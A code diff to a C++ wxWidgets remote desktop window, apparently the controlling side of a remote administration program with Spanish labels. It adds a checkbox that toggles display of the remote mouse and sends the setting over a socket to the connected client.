@@ -13,6 +13,7 @@ wxBEGIN_EVENT_TABLE(frameRemoteDesktop, wxFrame)
 	EVT_BUTTON(EnumRemoteDesktop::ID_BTN_Stop, frameRemoteDesktop::OnStop)
 	EVT_BUTTON(EnumRemoteDesktop::ID_BTN_Save, frameRemoteDesktop::OnSave)
 	EVT_TEXT(EnumRemoteDesktop::ID_CMB_Qoptions, frameRemoteDesktop::OnComboChange)
+	EVT_CHECKBOX(EnumRemoteDesktop::ID_CHK_Vmouse, frameRemoteDesktop::OnCheckVmouse)
 wxEND_EVENT_TABLE()
 
 frameRemoteDesktop::frameRemoteDesktop(wxWindow* pParent) :
@@ -44,6 +45,7 @@ frameRemoteDesktop::frameRemoteDesktop(wxWindow* pParent) :
 
 
 	wxCheckBox* chk_Control = new wxCheckBox(this, EnumRemoteDesktop::ID_CHK_Control, "Control Remoto (mouse y teclado)");
+	wxCheckBox* chk_Vmouse = new wxCheckBox(this, EnumRemoteDesktop::ID_CHK_Vmouse, "Mostar mouse remoto");
 	this->quality_options = new wxComboBox(this, EnumRemoteDesktop::ID_CMB_Qoptions, "Seleccionar calidad de imagen", wxDefaultPosition, wxDefaultSize, qOptions, wxCB_READONLY);
 
 	wxBoxSizer* sizer_controles = new wxBoxSizer(wxHORIZONTAL);
@@ -55,6 +57,8 @@ frameRemoteDesktop::frameRemoteDesktop(wxWindow* pParent) :
 	sizer_controles->Add(new wxStaticText(this, wxID_ANY, "Calidad:"));
 	sizer_controles->Add(this->quality_options);
 	sizer_controles->Add(chk_Control);
+	sizer_controles->Add(chk_Vmouse);
+
 	// - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 
 	this->imageCtrl = new wxStaticBitmap(this, EnumRemoteDesktop::ID_Bitmap, wxBitmap(10,10));
@@ -144,6 +148,15 @@ void frameRemoteDesktop::OnDrawBuffer(const char* cBuffer, int iBuffersize) {
 			}
 		}
 	}
+}
+
+void frameRemoteDesktop::OnCheckVmouse(wxCommandEvent& event) {
+	bool isChecked = event.IsChecked();
+	std::string strComando = std::to_string(EnumComandos::RD_Update_Vmouse);
+	strComando.append(1, CMD_DEL);
+	strComando.append(1, isChecked ? '1' : '0');
+	p_Servidor->cSend(this->sckCliente, strComando.c_str(), strComando.size(), 0, false);
+	event.Skip();
 }
 
 void frameRemoteDesktop::Onclose(wxCloseEvent&) {
